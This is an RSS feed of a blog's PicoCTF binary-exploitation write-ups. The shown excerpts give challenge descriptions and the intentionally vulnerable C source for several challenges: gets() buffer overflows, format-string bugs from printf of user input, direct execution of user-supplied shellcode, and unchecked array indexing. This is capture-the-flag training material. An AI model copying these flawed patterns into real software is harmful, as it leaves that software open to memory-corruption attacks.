<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Site</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/</link><description>Recent content on SBK Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/practice/picoctf/pwn/index.xml" rel="self" type="application/rss+xml"/><item><title>PicoCTF - babygame01</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame01/</guid><description>&lt;h1 id="picoctf---babygame01">
 PicoCTF - babygame01
 &lt;a class="anchor" href="#picoctf---babygame01">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Bof&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Get the flag and reach the exit. Welcome to BabyGame! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you&amp;rsquo;ll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 50227.
Hint 1: Use &amp;lsquo;w&amp;rsquo;,&amp;lsquo;a&amp;rsquo;,&amp;rsquo;s&amp;rsquo;,&amp;rsquo;d&amp;rsquo; to move around.
Hint 2: There may be secret commands to make your life easy.&lt;/p></description></item><item><title>PicoCTF - babygame02</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame02/</guid><description>&lt;h1 id="picoctf---babygame02">
 PicoCTF - babygame02
 &lt;a class="anchor" href="#picoctf---babygame02">#&lt;/a>
&lt;/h1>
&lt;h2 id="source">
 Source
 &lt;a class="anchor" href="#source">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> position[&lt;span style="color:#ae81ff">2&lt;/span>]; &lt;span style="color:#75715e">// [esp+0h] [ebp-AA0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> map[&lt;span style="color:#ae81ff">2700&lt;/span>]; &lt;span style="color:#75715e">// [esp+Bh] [ebp-A95h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> input; &lt;span style="color:#75715e">// [esp+A97h] [ebp-9h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>p_argc; &lt;span style="color:#75715e">// [esp+A98h] [ebp-8h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p_argc &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>argc;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> init_player(position);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> init_map(map, position);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print_map(map);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> signal(&lt;span style="color:#ae81ff">2&lt;/span>, sigint_handler);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> input &lt;span style="color:#f92672">=&lt;/span> getchar();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> move_player(position, input, map);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print_map(map);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( position[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">29&lt;/span> ); &lt;span style="color:#75715e">// y座標
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( position[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">89&lt;/span> ); &lt;span style="color:#75715e">// x座標
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> puts(&lt;span style="color:#e6db74">&amp;#34;You win!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler IDA Win Function&lt;/p></description></item><item><title>PicoCTF - buffer overflow 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/</guid><description>&lt;h1 id="picoctf---buffer-overflow-2">
 PicoCTF - buffer overflow 2
 &lt;a class="anchor" href="#picoctf---buffer-overflow-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Bof&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
 char buf[FLAGSIZE];
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if (f == NULL) {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf,FLAGSIZE,f);
 if (arg1 != 0xCAFEF00D)
 return;
 if (arg2 != 0xF00DF00D)
 return;
 printf(buf);
}

void vuln(){
 char buf[BUFSIZE];
 gets(buf);
 puts(buf);
}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 
 gid_t gid = getegid();
 setresgid(gid, gid, gid);

 puts(&amp;#34;Please enter your string: &amp;#34;);
 vuln();
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - fermat-strings</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---fermat-strings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---fermat-strings/</guid><description>&lt;h1 id="picoctf---fermat-strings">
 PicoCTF - fermat-strings
 &lt;a class="anchor" href="#picoctf---fermat-strings">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.runoob.com/cprogramming/c-function-strcspn.html">C 庫函數 - strcspn()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>該函數返回 str1 開頭連續都不含字符串 str2 中字符的字符數。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="http://tw.gitbook.net/c_standard_library/c_function_atoi.html">atoi() - C語言庫函數&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>這個函數返回一個int值轉換的整數。如果冇有有效的轉換可以執行，它返回零。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.runoob.com/cprogramming/c-function-snprintf.html">C 库函数 - snprintf()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>snprintf() 函數的返回值是輸出到 str 緩沖區中的字符數，不包括字符串結尾的空字符 \0。如果 snprintf() 輸出的字符數超過了 size 參數指定的緩沖區大小，則輸出的結果會被截斷，只有 size - 1 個字符被寫入緩沖區，最後一個字符為字符串結尾的空字符 \0。&lt;/p>
&lt;p>需要注意的是，snprintf() 函數返回的字符數並不包括字符串結尾的空字符 \0，因此如果需要將輸出結果作為一個字符串使用，則需要在緩沖區的末尾添加一個空字符 \0。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/format-specifiers-in-c/">Format Specifiers in C&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;math.h&amp;gt;

#define SIZE 0x100

int main(void)
{
 char A[SIZE];
 char B[SIZE];

 int a = 0;
 int b = 0;

 puts(&amp;#34;Welcome to Fermat\\&amp;#39;s Last Theorem as a service&amp;#34;);

 setbuf(stdout, NULL);
 setbuf(stdin, NULL);
 setbuf(stderr, NULL);

 printf(&amp;#34;A: &amp;#34;);
 read(0, A, SIZE);
 printf(&amp;#34;B: &amp;#34;);
 read(0, B, SIZE);

 A[strcspn(A, &amp;#34;\n&amp;#34;)] = 0;
 B[strcspn(B, &amp;#34;\n&amp;#34;)] = 0;

 a = atoi(A);
 b = atoi(B);

 if(a == 0 || b == 0) {
 puts(&amp;#34;Error: could not parse numbers!&amp;#34;);
 return 1;
 }

 char buffer[SIZE];
 snprintf(buffer, SIZE, &amp;#34;Calculating for A: %s and B: %s\n&amp;#34;, A, B);
 printf(buffer);

 int answer = -1;
 for(int i = 0; i &amp;lt; 100; i++) {
 if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
 answer = i;
 }
 }

 if(answer != -1) printf(&amp;#34;Found the answer: %d\n&amp;#34;, answer);
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - filtered-shellcode</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---filtered-shellcode/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---filtered-shellcode/</guid><description>&lt;h1 id="picoctf---filtered-shellcode">
 PicoCTF - filtered-shellcode
 &lt;a class="anchor" href="#picoctf---filtered-shellcode">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Shell Code
Reverse&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code Got From Server After Get Shell&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define MAX_LENGTH 1000

void execute(char *shellcode, size_t length) {
 if (!shellcode || !length) {
 exit(1);
 }
 size_t new_length = length * 2;
 char result[new_length + 1];

 int spot = 0;
 for (int i = 0; i &amp;lt; new_length; i++) {
 if ((i % 4) &amp;lt; 2) {
 result[i] = shellcode[spot++];
 } else {
 result[i] = &amp;#39;\x90&amp;#39;;
 }
 }
 // result[new_length] = &amp;#39;\xcc&amp;#39;;
 result[new_length] = &amp;#39;\xc3&amp;#39;;

 // Execute code
 int (*code)() = (int(*)())result;
 code();
}

int main(int argc, char *argv[]) {
 setbuf(stdout, NULL);
 char buf[MAX_LENGTH];
 size_t length = 0;
 char c = &amp;#39;\0&amp;#39;;

 printf(&amp;#34;Give me code to run:\n&amp;#34;);
 c = fgetc(stdin);
 while ((c != &amp;#39;\n&amp;#39;) &amp;amp;&amp;amp; (length &amp;lt; MAX_LENGTH)) {
 buf[length] = c;
 c = fgetc(stdin);
 length++;
 }
 if (length % 2) {
 buf[length] = &amp;#39;\x90&amp;#39;;
 length++;
 }
 execute(buf, length);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - flag leak</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---flag-leak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---flag-leak/</guid><description>&lt;h1 id="picoctf---flag-leak">
 PicoCTF - flag leak
 &lt;a class="anchor" href="#picoctf---flag-leak">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Format String Bug
&lt;img src="https://hackmd.io/_uploads/BkqBmpOih.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/SyvLXauon.png" alt="" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;wchar.h&amp;gt;
#include &amp;lt;locale.h&amp;gt;

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if (f == NULL) {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf,len,f); // size bound read
}

void vuln(){
 char flag[BUFSIZE];
 char story[128];

 readflag(flag, FLAGSIZE);

 printf(&amp;#34;Tell me a story and then I&amp;#39;ll tell you one &amp;gt;&amp;gt; &amp;#34;);
 scanf(&amp;#34;%127s&amp;#34;, story);
 printf(&amp;#34;Here&amp;#39;s a story - \n&amp;#34;);
 printf(story);
 printf(&amp;#34;\n&amp;#34;);
}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 
 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - function overwrite</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---function-overwrite/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---function-overwrite/</guid><description>&lt;h1 id="picoctf---function-overwrite">
 PicoCTF - function overwrite
 &lt;a class="anchor" href="#picoctf---function-overwrite">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Array Bound&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;wchar.h&amp;gt;
#include &amp;lt;locale.h&amp;gt;

#define BUFSIZE 64
#define FLAGSIZE 64

int calculate_story_score(char *story, size_t len)
{
 int score = 0;
 for (size_t i = 0; i &amp;lt; len; i++)
 {
 score += story[i];
 }

 return score;
}

void easy_checker(char *story, size_t len)
{
 if (calculate_story_score(story, len) == 1337)
 {
 char buf[FLAGSIZE] = {0};
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;, &amp;#34;r&amp;#34;);
 if (f == NULL)
 {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf, FLAGSIZE, f); // size bound read
 printf(&amp;#34;You&amp;#39;re 1337. Here&amp;#39;s the flag.\n&amp;#34;);
 printf(&amp;#34;%s\n&amp;#34;, buf);
 }
 else
 {
 printf(&amp;#34;You&amp;#39;ve failed this class.&amp;#34;);
 }
}

void hard_checker(char *story, size_t len)
{
 if (calculate_story_score(story, len) == 13371337)
 {
 char buf[FLAGSIZE] = {0};
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;, &amp;#34;r&amp;#34;);
 if (f == NULL)
 {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf, FLAGSIZE, f); // size bound read
 printf(&amp;#34;You&amp;#39;re 13371337. Here&amp;#39;s the flag.\n&amp;#34;);
 printf(&amp;#34;%s\n&amp;#34;, buf);
 }
 else
 {
 printf(&amp;#34;You&amp;#39;ve failed this class.&amp;#34;);
 }
}

void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
 char story[128];
 int num1, num2;

 printf(&amp;#34;Tell me a story and then I&amp;#39;ll tell you if you&amp;#39;re a 1337 &amp;gt;&amp;gt; &amp;#34;);
 scanf(&amp;#34;%127s&amp;#34;, story);
 printf(&amp;#34;On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n&amp;#34;);
 scanf(&amp;#34;%d %d&amp;#34;, &amp;amp;num1, &amp;amp;num2);

 if (num1 &amp;lt; 10)
 {
 fun[num1] += num2;
 }

 check(story, strlen(story));
}
 
int main(int argc, char **argv)
{

 setvbuf(stdout, NULL, _IONBF, 0);

 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Guessing Game 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-1/</guid><description>&lt;h1 id="picoctf---guessing-game-1">
 PicoCTF - Guessing Game 1
 &lt;a class="anchor" href="#picoctf---guessing-game-1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>ROP Chain
&lt;a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call Table for x86 64&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/stat.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define BUFSIZE 100
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">increment&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> in) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> in &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">get_random&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> rand() &lt;span style="color:#f92672">%&lt;/span> BUFSIZE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">do_stuff&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">long&lt;/span> ans &lt;span style="color:#f92672">=&lt;/span> get_random();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	ans &lt;span style="color:#f92672">=&lt;/span> increment(ans);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;What number would you like to guess?&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> guess[BUFSIZE];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fgets(guess, BUFSIZE, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">long&lt;/span> g &lt;span style="color:#f92672">=&lt;/span> atol(guess);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>g) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;That&amp;#39;s not a valid number!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (g &lt;span style="color:#f92672">==&lt;/span> ans) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			printf(&lt;span style="color:#e6db74">&amp;#34;Congrats! You win! Your prize is this print statement!&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			printf(&lt;span style="color:#e6db74">&amp;#34;Nope!&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> res;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">win&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> winner[BUFSIZE];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;New winner!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Name? &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fgets(winner, &lt;span style="color:#ae81ff">360&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Congrats %s&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, winner);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, NULL, _IONBF, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">// Set the gid to the effective gid
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#75715e">// this prevents /bin/sh from dropping the privileges
